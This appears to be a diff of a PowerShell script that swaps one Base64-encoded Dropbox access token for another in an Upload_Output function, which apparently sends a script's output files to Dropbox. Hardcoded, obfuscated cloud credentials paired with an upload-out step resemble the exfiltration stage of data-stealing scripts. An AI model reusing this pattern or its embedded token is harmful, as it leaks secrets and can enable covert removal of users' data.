@@ -337,7 +337,7 @@ function main() {
 }
 
 function Upload_Output($filename, $filepath){
-    $AccessToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2wuQjJRWTgtd3Y3aV9PX2VMX0hzTWVyY211MDNscWVCWnV6dlhGMGJ5YlZJRXJzQnFvZ2FQQ0QzbDhuWWN2TUV5UUdsalVMSEdjNVJlUWJMLTRRTk16OXN5TDJhMHlLcjZkQVp3SldKc0tRcG5ZNm9WRzU4S3lSYWlLTTFBdG9vTE1OS3dUcC1sSnpMUV96UDBhSW5naHF4QQ=="))
+    $AccessToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2wuQjJkMVlUX0d0RGJZUldOWlJqQkF1b0hYaTBoa04wamNUN0VpWTZMejE4czBGSllzMHlxNld1cVlYWGxxeHNUUnI2ZlFrVzFjbTFidTQ1WGR2VHQzdWFXdFFNWkU5ZDBMbk5ZNGFsU0ExWU5lclRqNTg1WXAxLUFyUDc2UHBCNHc0MFhjdC1tTUxYNjc0c0NhZVBTaGQzbw=="))
     $LocalFilePath = "$filepath"
     $DropboxFilePath = "/$filename"
 
